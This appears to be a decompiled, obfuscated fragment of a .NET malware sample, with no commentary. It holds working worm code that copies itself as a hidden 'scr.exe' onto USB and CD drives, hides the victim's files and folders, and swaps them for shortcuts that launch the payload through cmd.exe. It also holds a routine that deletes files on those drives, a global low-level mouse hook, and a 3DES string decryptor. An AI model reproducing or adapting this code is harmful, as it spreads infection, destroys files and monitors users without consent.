							switch ((num2 = (num3 ^ 2743632462u)) % 3u)
							{
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 2693688966u ^ 2847944722u);
								continue;
							case 2u:
								goto IL_105;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return utf8Encoding.GetString(bytes);
		}

		// Token: 0x06000098 RID: 152 RVA: 0x0002134C File Offset: 0x0001F54C
		public string lz(string mn, string mo)
		{
			byte[] bytes = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(mo));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider;
				for (;;)
				{
					IL_73:
					uint num = 1243401807u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 354449833u)) % 3u)
						{
						case 1u:
							tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
							tripleDESCryptoServiceProvider.Key = key;
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
							num = (num2 * 2665635613u ^ 3168494272u);
							continue;
						case 2u:
							goto IL_73;
						}
						goto Block_3;
					}
				}
				Block_3:
				byte[] array = Convert.FromBase64String(mn);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_E9:
						uint num3 = 588586397u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 354449833u)) % 3u)
							{
							case 0u:
								goto IL_E9;
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 1626393187u ^ 2229516674u);
								continue;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return utf8Encoding.GetString(bytes);
		}

		// Token: 0x04000369 RID: 873
		private byte[] mw;

		// Token: 0x0400036A RID: 874
		private string mq;
	}

	// Token: 0x02000014 RID: 20
	public class np
	{
		// Token: 0x06000099 RID: 153 RVA: 0x00021470 File Offset: 0x0001F670
		public np()
		{
			for (;;)
			{
				IL_81:
				uint num = 3874820071u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 3741608718u)) % 5u)
					{
					case 1u:
						this.sx = false;
						num = (num2 * 3230335091u ^ 1785989493u);
						continue;
					case 2u:
						this.ExeName = "scr.exe";
						num = (num2 * 4159505124u ^ 3850763528u);
						continue;
					case 3u:
						goto IL_81;
					case 4u:
						this.sw = null;
						num = (num2 * 1932627486u ^ 2064115436u);
						continue;
					}
					return;
				}
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00021508 File Offset: 0x0001F708
		public void nr()
		{
			if (this.sw == null)
			{
				for (;;)
				{
					IL_62:
					uint num = 2515624676u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 2264692967u)) % 3u)
						{
						case 0u:
							goto IL_62;
						case 1u:
							this.sw = new Thread(new ThreadStart(this.ov), 1);
							this.sw.Start();
							num = (num2 * 1756479315u ^ 4046350634u);
							continue;
						}
						goto Block_2;
					}
				}
				Block_2:;
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00021580 File Offset: 0x0001F780
		public void ns()
		{
			this.sx = true;
			for (;;)
			{
				IL_51:
				if (this.sw != null)
				{
					goto IL_3D;
				}
				int num = 317370895;
				for (;;)
				{
					IL_0E:
					switch ((num ^ 1767388743) % 5)
					{
					case 0:
						goto IL_5B;
					case 1:
						goto IL_3D;
					case 2:
						num = 1626637630;
						continue;
					case 4:
						goto IL_51;
					}
					goto Block_1;
				}
				IL_3D:
				Thread.Sleep(1);
				num = 554779610;
				goto IL_0E;
			}
			Block_1:
			goto IL_3C4;
			IL_5B:
			DriveInfo[] drives = DriveInfo.GetDrives();
			int num2 = 0;
			IL_38C:
			if (num2 < drives.Length)
			{
				goto IL_3C4;
			}
			int num3 = 1394144359;
			IL_399:
			switch ((num3 ^ 1767388743) % 3)
			{
			case 1:
				goto IL_38C;
			case 2:
				IL_3BD:
				num3 = 1586264052;
				goto IL_399;
			}
			return;
			IL_3C4:
			DriveInfo driveInfo = drives[num2];
			try
			{
				if (driveInfo.IsReady)
				{
					string[] files;
					int num6;
					for (;;)
					{
						IL_176:
						uint num4 = 1168972860u;
						for (;;)
						{
							uint num5;
							switch ((num5 = (num4 ^ 1767388743u)) % 8u)
							{
							case 0u:
								File.Delete(driveInfo.Name + this.ExeName);
								num4 = (num5 * 1572562389u ^ 3739045685u);
								continue;
							case 1u:
								goto IL_210;
							case 2u:
								goto IL_A7;
							case 3u:
								if (driveInfo.DriveType == DriveType.Removable | driveInfo.DriveType == DriveType.CDRom)
								{
									num4 = (num5 * 3148088695u ^ 3533474413u);
									continue;
								}
								goto IL_335;
							case 4u:
								goto IL_176;
							case 6u:
								File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
								num4 = (num5 * 3188825769u ^ 319529025u);
								continue;
							case 7u:
								if (File.Exists(driveInfo.Name + this.ExeName))
								{
									num4 = (num5 * 1958248223u ^ 2291320000u);
									continue;
								}
								goto IL_A7;
							}
							goto Block_9;
							IL_A7:
							files = Directory.GetFiles(driveInfo.Name);
							num6 = 0;
							num4 = 1216378214u;
						}
					}
					Block_9:
					goto IL_24F;
					IL_210:
					if (num6 < files.Length)
					{
						goto IL_24F;
					}
					int num7 = 1436697017;
					IL_21D:
					string[] directories;
					int num8;
					switch ((num7 ^ 1767388743) % 4)
					{
					case 0:
						IL_248:
						num7 = 1505506892;
						goto IL_21D;
					case 1:
						goto IL_32A;
					case 2:
						directories = Directory.GetDirectories(driveInfo.Name);
						num8 = 0;
						break;
					case 3:
						goto IL_210;
					default:
						goto IL_32A;
					}
					IL_26A:
					int num9;
					if (num8 >= directories.Length)
					{
						num9 = 166642619;
						goto IL_2FF;
					}
					goto IL_32A;
					IL_2FA:
					num9 = 921874620;
					IL_2FF:
					switch ((num9 ^ 1767388743) % 3)
					{
					case 0:
						goto IL_2FA;
					case 1:
						goto IL_335;
					case 2:
						goto IL_26A;
					default:
						goto IL_335;
					}
					IL_32A:
					string path = directories[num8];
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						for (;;)
						{
							IL_2DD:
							uint num10 = 150756882u;
							for (;;)
							{
								uint num5;
								switch ((num5 = (num10 ^ 1767388743u)) % 4u)
								{
								case 1u:
									directoryInfo.Attributes = FileAttributes.Normal;
									num10 = (num5 * 3687002008u ^ 124927217u);
									continue;
								case 2u:
									directoryInfo = null;
									num10 = (num5 * 2300077061u ^ 1392426217u);
									continue;
								case 3u:
									goto IL_2DD;
								}
								goto Block_19;
							}
						}
						Block_19:;
					}
					catch (Exception ex)
					{
					}
					string text;
					checked
					{
						num8++;
						goto IL_2FA;
						IL_24F:
						text = files[num6];
					}
					try
					{
						File.SetAttributes(text, FileAttributes.Normal);
						for (;;)
						{
							IL_1F1:
							uint num11 = 538644736u;
							for (;;)
							{
								uint num5;
								switch ((num5 = (num11 ^ 1767388743u)) % 4u)
								{
								case 0u:
									goto IL_1F1;
								case 2u:
									File.Delete(text);
									num11 = (num5 * 2042038088u ^ 3503616630u);
									continue;
								case 3u:
									if (text.ToLower().EndsWith(<Module>.smethod_strings_decryptor(335096 -> ""))))
									{
										num11 = (num5 * 4184367489u ^ 1668197614u);
										continue;
									}
									break;
								}
								goto Block_17;
							}
						}
						Block_17:;
					}
					catch (Exception ex2)
					{
					}
					checked
					{
						num6++;
						goto IL_248;
					}
				}
				IL_335:;
			}
			catch (Exception ex3)
			{
				for (;;)
				{
					IL_37B:
					uint num12 = 533537470u;
					for (;;)
					{
						uint num5;
						switch ((num5 = (num12 ^ 1767388743u)) % 3u)
						{
						case 0u:
							goto IL_37B;
						case 2u:
							num12 = (num5 * 2731924634u ^ 975898958u);
							continue;
						}
						goto Block_22;
					}
				}
				Block_22:;
			}
			checked
			{
				num2++;
				goto IL_3BD;
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x000219A8 File Offset: 0x0001FBA8
		public void ov()
		{
			this.sx = false;
			for (;;)
			{
				DriveInfo[] drives;
				int num;
				if (!this.sx)
				{
					for (;;)
					{
						IL_44:
						drives = DriveInfo.GetDrives();
						num = 0;
						int num2 = -362056387;
						for (;;)
						{
							switch ((num2 ^ -603099400) % 4)
							{
							case 0:
								num2 = -1257476014;
								continue;
							case 1:
								goto IL_6DD;
							case 2:
								goto IL_44;
							}
							goto Block_2;
						}
					}
					Block_2:
					goto IL_71D;
				}
				uint num3 = 3909605045u;
				IL_6EA:
				uint num4;
				switch ((num4 = (num3 ^ 3691867896u)) % 5u)
				{
				case 0u:
					continue;
				case 1u:
					IL_6DD:
					if (num >= drives.Length)
					{
						num3 = 4269689295u;
						goto IL_6EA;
					}
					goto IL_71D;
				case 2u:
					IL_716:
					num3 = 2329081658u;
					goto IL_6EA;
				case 3u:
					IL_6C1:
					Thread.Sleep(5000);
					num3 = (num4 * 31122014u ^ 1990640239u);
					goto IL_6EA;
				}
				break;
				IL_71D:
				DriveInfo driveInfo = drives[num];
				try
				{
					if (driveInfo.IsReady && ((driveInfo.TotalFreeSpace > 0L & driveInfo.DriveType == DriveType.Removable) | driveInfo.DriveType == DriveType.CDRom))
					{
						try
						{
							if (File.Exists(driveInfo.Name + this.ExeName))
							{
								goto IL_291;
							}
							goto IL_65F;
							uint num5;
							for (;;)
							{
								IL_5F7:
								object instance;
								string text;
								string path;
								int num6;
								string[] directories;
								string[] files;
								int num7;
								switch ((num4 = (num5 ^ 3691867896u)) % 20u)
								{
								case 0u:
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_strings_decryptor(334320 -> "TargetPath")), new object[]
									{
										<Module>.smethod_strings_decryptor(334296 -> "cmd.exe"))
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_strings_decryptor(334368 -> "WorkingDirectory")), new object[]
									{
										""
									}, null, null, false, true);
									num5 = (num4 * 2060215016u ^ 2852389324u);
									continue;
								case 1u:
								{
									object instance2;
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_strings_decryptor(334464 -> "Arguments")), new object[]
									{
										string.Concat(new string[]
										{
											<Module>.smethod_strings_decryptor(334440 -> "/c start")),
											this.ExeName.Replace(" ", "\" \""),
											<Module>.smethod_strings_decryptor(334512 -> "&start")),
											new FileInfo(text).Name.Replace(" ", "\" \""),
											<Module>.smethod_strings_decryptor(334488 -> "& exit"))
										})
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_strings_decryptor(334560 -> "IconLocation")), new object[]
									{
										this.rt(Path.GetExtension(text))
									}, null, null, false, true);
									NewLateBinding.LateCall(instance2, null, <Module>.smethod_strings_decryptor(334664 -> "Save")), new object[0], null, null, null, true);
									num5 = (num4 * 1741834517u ^ 2431183885u);
									continue;
								}
								case 2u:
									goto IL_1C6;
								case 3u:
									File.SetAttributes(text, FileAttributes.Hidden);
									num5 = (num4 * 497480440u ^ 63534394u);
									continue;
								case 4u:
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_strings_decryptor(333960 -> "Arguments")), new object[]
									{
										string.Concat(new string[]
										{
											<Module>.smethod_strings_decryptor(333904 -> "/c start")),
											this.ExeName.Replace(" ", "\" \""),
											<Module>.smethod_strings_decryptor(334008 -> "&explorer /root,"%CD%")),
											new DirectoryInfo(path).Name,
											<Module>.smethod_strings_decryptor(334080 -> "" & exit"))
										})
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_strings_decryptor(334056 -> "IconLocation")), new object[]
									{
										<Module>.smethod_strings_decryptor(334128 -> "%SystemRoot%\system32\SHELL32.dll,3"))
									}, null, null, false, true);
									NewLateBinding.LateCall(instance, null, <Module>.smethod_strings_decryptor(334104 -> "Save")), new object[0], null, null, null, true);
									instance = null;
									checked
									{
										num6++;
									}
									num5 = (num4 * 2617359829u ^ 1400329961u);
									continue;
								case 5u:
									if (Operators.CompareString(Path.GetExtension(text).ToLower(), <Module>.smethod_strings_decryptor(335168 -> ".lnk")), false) != 0 & Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + this.ExeName.ToLower(), false) != 0)
									{
										num5 = (num4 * 2788810690u ^ 75895153u);
										continue;
									}
									goto IL_281;
								case 7u:
									directories = Directory.GetDirectories(driveInfo.Name);
									num5 = (num4 * 1343686739u ^ 1028684447u);
									continue;
								case 8u:
									goto IL_65F;
								case 9u:
									File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
									num5 = (num4 * 979171570u ^ 1347375634u);
									continue;
								case 10u:
									num6 = 0;
									num5 = (num4 * 3275960384u ^ 4193239117u);
									continue;
								case 11u:
									files = Directory.GetFiles(driveInfo.Name);
									num7 = 0;
									num5 = (num4 * 394362879u ^ 1654150459u);
									continue;
								case 12u:
									goto IL_291;
								case 13u:
									goto IL_281;
								case 14u:
									num5 = (num4 * 4279640614u ^ 3428863431u);
									continue;
								case 15u:
									goto IL_BC;
								case 16u:
								{
									object instance2 = null;
									num5 = (num4 * 3988571516u ^ 617094009u);
									continue;
								}
								case 17u:
									if (num6 >= directories.Length)
									{
										num5 = 2401209114u;
										continue;
									}
									goto IL_1C6;
								case 18u:
								{
									File.Delete(driveInfo.Name + new FileInfo(text).Name + <Module>.smethod_strings_decryptor(335144 -> ".lnk")));
									object instance2 = NewLateBinding.LateGet(Interaction.CreateObject(<Module>.smethod_strings_decryptor(334704 -> "WScript.Shell")), ""), null, <Module>.smethod_strings_decryptor(334680 -> "CreateShortcut")), new object[]
									{
										driveInfo.Name + new FileInfo(text).Name + <Module>.smethod_strings_decryptor(334752 -> ".lnk"))
									}, null, null, null);
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_strings_decryptor(334856 -> "TargetPath")), new object[]
									{
										<Module>.smethod_strings_decryptor(334800 -> "cmd.exe"))
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_strings_decryptor(334904 -> "WorkingDirectory")), new object[]
									{
										""
									}, null, null, false, true);
									num5 = (num4 * 812786779u ^ 2356694679u);
									continue;
								}
								case 19u:
									if (num7 >= files.Length)
									{
										num5 = 2446782203u;
										continue;
									}
									goto IL_BC;
								}
								break;
								IL_BC:
								text = files[num7];
								num5 = 3162181857u;
								continue;
								IL_1C6:
								path = directories[num6];
								File.SetAttributes(path, FileAttributes.Hidden);
								File.Delete(driveInfo.Name + new DirectoryInfo(path).Name + <Module>.smethod_strings_decryptor(334608 -> ".lnk")));
								instance = NewLateBinding.LateGet(Interaction.CreateObject(<Module>.smethod_strings_decryptor(334200 -> "WScript.Shell")), ""), null, <Module>.smethod_strings_decryptor(334272 -> "CreateShortcut")), new object[]
								{
									driveInfo.Name + Path.GetFileNameWithoutExtension(path) + <Module>.smethod_strings_decryptor(334248 -> ".lnk"))
								}, null, null, null);
								num5 = 2372862652u;
								continue;
								IL_281:
								checked
								{
									num7++;
									num5 = 2321666107u;
								}
							}
							goto IL_6B1;
							IL_291:
							num5 = 2692670757u;
							goto IL_5F7;
							IL_65F:
							File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.Name + this.ExeName, true);
							File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Hidden);
							num5 = 4117903375u;
							goto IL_5F7;
						}
						catch (Exception ex)
						{
						}
					}
					IL_6B1:
					goto IL_72F;
				}
				catch (Exception ex2)
				{
					goto IL_72F;
				}
				goto IL_6C1;
				IL_72F:
				checked
				{
					num++;
					goto IL_716;
				}
			}
			this.sw = null;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00022128 File Offset: 0x00020328
		public string rt(string ru)
		{
			string result;
			try
			{
				object obj = Registry.LocalMachine.OpenSubKey(<Module>.smethod_strings_decryptor(333664 -> "Software\Classes\")), false);
				for (;;)
				{
					IL_194:
					uint num = 2969796890u;
					for (;;)
					{
						uint num2;
						string text;
						switch ((num2 = (num ^ 2460978966u)) % 6u)
						{
						case 0u:
							goto IL_194;
						case 1u:
							if (!text.Contains(","))
							{
								num = (num2 * 1511628162u ^ 1491163112u);
								continue;
							}
							goto IL_3C;
						case 2u:
						{
							object instance = obj;
							Type type = null;
							string memberName = <Module>.smethod_strings_decryptor(333768 -> "OpenSubKey"));
							object[] array = new object[1];
							object[] array2 = array;
							int num3 = 0;
							object instance2 = obj;
							Type type2 = null;
							string memberName2 = <Module>.smethod_strings_decryptor(333712 -> "OpenSubKey"));
							object[] array3 = new object[]
							{
								ru,
								false
							};
							object[] arguments = array3;
							string[] argumentNames = null;
							Type[] typeArguments = null;
							bool[] array4 = new bool[]
							{
								true,
								false
							};
							object instance3 = NewLateBinding.LateGet(instance2, type2, memberName2, arguments, argumentNames, typeArguments, array4);
							if (array4[0])
							{
								ru = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
							}
							array2[num3] = Operators.ConcatenateObject(NewLateBinding.LateGet(instance3, null, <Module>.smethod_strings_decryptor(333816 -> "GetValue")), new object[]
							{
								""
							}, null, null, null), <Module>.smethod_strings_decryptor(333888 -> "\DefaultIcon\")));
							text = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, type, memberName, array, null, null, null), null, <Module>.smethod_strings_decryptor(333864 -> "GetValue")), new object[]
							{
								"",
								""
							}, null, null, null));
							num = 3220906947u;
							continue;
						}
						case 3u:
							goto IL_3C;
						case 4u:
							text += ",0";
							num = (num2 * 1651742611u ^ 2029021307u);
							continue;
						}
						goto Block_4;
						IL_3C:
						result = text;
						num = 3458431671u;
					}
				}
				Block_4:;
			}
			catch (Exception ex)
			{
				for (;;)
				{
					IL_1E7:
					uint num4 = 2784735848u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num4 ^ 2460978966u)) % 3u)
						{
						case 0u:
							goto IL_1E7;
						case 2u:
							result = "";
							num4 = (num2 * 3359794220u ^ 1908914810u);
							continue;
						}
						goto Block_6;
					}
				}
				Block_6:;
			}
			return result;
		}

		// Token: 0x0400036B RID: 875
		private bool sx;

		// Token: 0x0400036C RID: 876
		private Thread sw;

		// Token: 0x0400036D RID: 877
		public string ExeName;
	}

	// Token: 0x02000015 RID: 21
	public class ux
	{
		// Token: 0x0600009F RID: 159
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int uq);

		// Token: 0x060000A0 RID: 160
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int SetWindowsHookExA(int vy, Delegate vx, IntPtr vw, int vq);

		// Token: 0x060000A1 RID: 161
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int CallNextHookEx(IntPtr yx, int yw, int yq, object yz);

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x060000A2 RID: 162 RVA: 0x00022344 File Offset: 0x00020544
		// (remove) Token: 0x060000A3 RID: 163 RVA: 0x00022368 File Offset: 0x00020568
		public event afg.ux.tu ace
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abt = (afg.ux.tu)Delegate.Combine(this.abt, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abt = (afg.ux.tu)Delegate.Remove(this.abt, value);
			}
		}

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x060000A4 RID: 164 RVA: 0x0002238C File Offset: 0x0002058C
		// (remove) Token: 0x060000A5 RID: 165 RVA: 0x000223B0 File Offset: 0x000205B0
		public event afg.ux.tv acf
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abu = (afg.ux.tv)Delegate.Combine(this.abu, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abu = (afg.ux.tv)Delegate.Remove(this.abu, value);
			}
		}

		// Token: 0x14000003 RID: 3
		// (add) Token: 0x060000A6 RID: 166 RVA: 0x000223D4 File Offset: 0x000205D4
		// (remove) Token: 0x060000A7 RID: 167 RVA: 0x000223F8 File Offset: 0x000205F8
		public event afg.ux.ty acg
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abv = (afg.ux.ty)Delegate.Combine(this.abv, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abv = (afg.ux.ty)Delegate.Remove(this.abv, value);
			}
		}

		// Token: 0x14000004 RID: 4
		// (add) Token: 0x060000A8 RID: 168 RVA: 0x0002241C File Offset: 0x0002061C
		// (remove) Token: 0x060000A9 RID: 169 RVA: 0x00022440 File Offset: 0x00020640
		public event afg.ux.tx ach
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.aby = (afg.ux.tx)Delegate.Combine(this.aby, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.aby = (afg.ux.tx)Delegate.Remove(this.aby, value);
			}
		}

		// Token: 0x14000005 RID: 5
		// (add) Token: 0x060000AA RID: 170 RVA: 0x00022464 File Offset: 0x00020664
		// (remove) Token: 0x060000AB RID: 171 RVA: 0x00022488 File Offset: 0x00020688
		public event afg.ux.tw acj
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abx = (afg.ux.tw)Delegate.Combine(this.abx, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abx = (afg.ux.tw)Delegate.Remove(this.abx, value);
			}
		}

		// Token: 0x14000006 RID: 6
		// (add) Token: 0x060000AC RID: 172 RVA: 0x000224AC File Offset: 0x000206AC
		// (remove) Token: 0x060000AD RID: 173 RVA: 0x000224D0 File Offset: 0x000206D0
		public event afg.ux.tq ack
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.abw = (afg.ux.tq)Delegate.Combine(this.abw, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.abw = (afg.ux.tq)Delegate.Remove(this.abw, value);
			}
		}

		// Token: 0x060000AE RID: 174 RVA: 0x000224F4 File Offset: 0x000206F4
		public void xw()
		{
			this.acd = new afg.ux.sq(this.wq);
			for (;;)
			{
				IL_6E:
				uint num = 1217837021u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 1041107879u)) % 3u)
					{
					case 1u:
						this.abq = afg.ux.SetWindowsHookExA(14, this.acd, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
						num = (num2 * 2547301889u ^ 3638389897u);
						continue;
					case 2u:
						goto IL_6E;
					}
					return;
				}
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00022578 File Offset: 0x00020778
		public int xq()
		{
			return afg.ux.UnhookWindowsHookEx(this.abq);
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00022590 File Offset: 0x00020790
		private int wq(int wz, int qz, ref afg.ux.sz abc)
		{
			int result;
			if (wz == 0)
			{
				for (;;)
				{
					IL_56E:
					uint num = 1249575496u;
					for (;;)
					{
						uint num2;
						afg.ux.tz tz;
						int num3;
						bool flag;
						MouseButtons button;
						int num4;
						switch ((num2 = (num ^ 1793639442u)) % 49u)
						{
						case 0u:
						{
							afg.ux.ty ty;
							ty(this, ref tz);
							num = (num2 * 1170795411u ^ 2619021412u);
							continue;
						}
						case 1u:
							num = (num2 * 3716289522u ^ 4262039680u);
							continue;
						case 2u:
							goto IL_28D;
						case 3u:
						{
							afg.ux.tv tv;
							tv(this, ref tz);
							num = (num2 * 1961415949u ^ 86523534u);
							continue;
						}
						case 4u:
							num3 = 1;
							num = (num2 * 1127967169u ^ 2339617372u);
							continue;
						case 5u:
							goto IL_2B9;
						case 6u:
							if (flag)
							{
								num = (num2 * 2391123421u ^ 1260359777u);
								continue;
							}
							goto IL_EC;
						case 7u:
						{
							afg.ux.tw tw;
							tw(this, ref tz);
							num = (num2 * 3212460584u ^ 401108618u);
							continue;
						}
						case 8u:
							this.abz = abc.Point;
							num = (num2 * 1301703944u ^ 1651568066u);
							continue;
						case 9u:
							button = MouseButtons.Right;
							num3 = 1;
							num = (num2 * 1986509983u ^ 418756124u);
							continue;
						case 10u:
						{
							afg.ux.tx tx;
							tx(this, ref tz);
							num = (num2 * 3763971691u ^ 3111597108u);
							continue;
						}
						case 11u:
						{
							afg.ux.tx tx;
							if (tx != null)
							{
								num = (num2 * 1597574788u ^ 979433283u);
								continue;
							}
							goto IL_6D;
						}
						case 12u:
							goto IL_299;
						case 13u:
							goto IL_8A;
						case 14u:
							goto IL_2AC;
						case 15u:
						{
							afg.ux.tv tv;
							if (tv != null)
							{
								num = (num2 * 1267380417u ^ 445009727u);
								continue;
							}
							goto IL_F9;
						}
						case 16u:
							num3 = 1;
							num = (num2 * 961524881u ^ 321528647u);
							continue;
						case 17u:
							num = (num2 * 3880927401u ^ 1883018221u);
							continue;
						case 18u:
						{
							afg.ux.tw tw = this.abx;
							num = (num2 * 3192031671u ^ 3643441417u);
							continue;
						}
						case 20u:
							goto IL_279;
						case 21u:
							goto IL_98;
						case 22u:
							goto IL_2CD;
						case 23u:
							button = MouseButtons.Right;
							num3 = 1;
							num = (num2 * 2362165907u ^ 3379194167u);
							continue;
						case 24u:
							button = MouseButtons.Middle;
							num3 = 1;
							num = (num2 * 678324124u ^ 1971541668u);
							continue;
						case 25u:
							switch (qz)
							{
							case 513:
								goto IL_1BF;
							case 514:
								goto IL_12C;
							case 515:
								goto IL_279;
							case 516:
								goto IL_28D;
							case 517:
								goto IL_10B;
							case 518:
								goto IL_118;
							case 519:
								goto IL_299;
							case 520:
								goto IL_2AC;
							case 521:
								goto IL_2B9;
							case 522:
								goto IL_2CD;
							default:
								num = (num2 * 670927929u ^ 3811572758u);
								continue;
							}
							break;
						case 26u:
							num = (num2 * 213459343u ^ 3008046452u);
							continue;
						case 27u:
							tz = new afg.ux.tz(button, num3, num4, abc.Point);
							num = 1598513796u;
							continue;
						case 28u:
							num = (num2 * 2222419208u ^ 202453052u);
							continue;
						case 29u:
						{
							afg.ux.tq tq;
							tq(this, ref tz);
							num = (num2 * 2942865525u ^ 1243820740u);
							continue;
						}
						case 30u:
							goto IL_1BF;
						case 31u:
						{
							afg.ux.tq tq = this.abw;
							if (tq != null)
							{
								num = (num2 * 429763906u ^ 1911649836u);
								continue;
							}
							goto IL_8A;
						}
						case 32u:
							goto IL_F9;
						case 33u:
							goto IL_56E;
						case 34u:
							goto IL_EC;
						case 35u:
						{
							afg.ux.tu tu;
							tu(this, ref tz);
							num = (num2 * 1646036541u ^ 267525187u);
							continue;
						}
						case 36u:
						{
							afg.ux.tw tw;
							if (tw != null)
							{
								num = (num2 * 565242185u ^ 2919009059u);
								continue;
							}
							goto IL_98;
						}
						case 37u:
							return -1;
						case 38u:
						{
							afg.ux.tv tv = this.abu;
							num = (num2 * 1352150148u ^ 2678573750u);
							continue;
						}
						case 39u:
							goto IL_12C;
						case 40u:
							goto IL_118;
						case 41u:
							goto IL_10B;
						case 42u:
						{
							afg.ux.tu tu = this.abt;
							if (tu != null)
							{
								num = (num2 * 3230947113u ^ 913606717u);
								continue;
							}
							goto IL_EC;
						}
						case 43u:
							goto IL_6D;
						case 44u:
						{
							afg.ux.tx tx = this.aby;
							num = (num2 * 1736008683u ^ 2011845214u);
							continue;
						}
						case 45u:
							goto IL_5E;
						case 46u:
						{
							afg.ux.ty ty = this.abv;
							if (ty != null)
							{
								num = (num2 * 2813729840u ^ 3983156250u);
								continue;
							}
							goto IL_5E;
						}
						case 47u:
							button = MouseButtons.Left;
							num = (num2 * 1015034391u ^ 3563132154u);
							continue;
						case 48u:
							num = (num2 * 2522382864u ^ 1945169516u);
							continue;
						}
						goto Block_16;
						IL_5E:
						if (num3 == 2)
						{
							num = 347428774u;
							continue;
						}
						goto IL_6D;
						IL_F9:
						if (num3 > 0)
						{
							num = 1031735726u;
							continue;
						}
						goto IL_5E;
						IL_EC:
						bool flag2;
						if (flag2)
						{
							num = 1791944823u;
							continue;
						}
						goto IL_F9;
						IL_6D:
						if (abc.Point != this.abz)
						{
							num = 302787501u;
							continue;
						}
						IL_8A:
						if (num4 != 0)
						{
							num = 1085367991u;
							continue;
						}
						IL_98:
						if (tz.uy)
						{
							num = 1016173202u;
							continue;
						}
						return result;
						IL_10B:
						flag = true;
						num = 501590642u;
						continue;
						IL_118:
						button = MouseButtons.Right;
						num3 = 2;
						num = 1919370410u;
						continue;
						IL_12C:
						flag = true;
						button = MouseButtons.Left;
						num3 = 1;
						num = 1444986722u;
						continue;
						IL_1BF:
						flag2 = true;
						num = 1457285162u;
						continue;
						IL_279:
						button = MouseButtons.Left;
						num3 = 2;
						num = 1878244284u;
						continue;
						IL_28D:
						flag2 = true;
						num = 645679130u;
						continue;
						IL_299:
						flag2 = true;
						button = MouseButtons.Middle;
						num = 907218649u;
						continue;
						IL_2AC:
						flag = true;
						num = 487700952u;
						continue;
						IL_2B9:
						button = MouseButtons.Middle;
						num3 = 2;
						num = 868527995u;
						continue;
						IL_2CD:
						num4 = abc.Code >> 16;
						num = 1878244284u;
					}
				}
				Block_16:
				return result;
			}
			return result;
		}

		// Token: 0x0400036E RID: 878
		private afg.ux.tu abt;

		// Token: 0x0400036F RID: 879
		private afg.ux.tv abu;

		// Token: 0x04000370 RID: 880
		private afg.ux.ty abv;

		// Token: 0x04000371 RID: 881
		private afg.ux.tx aby;

		// Token: 0x04000372 RID: 882
		private afg.ux.tw abx;

		// Token: 0x04000373 RID: 883
		private afg.ux.tq abw;
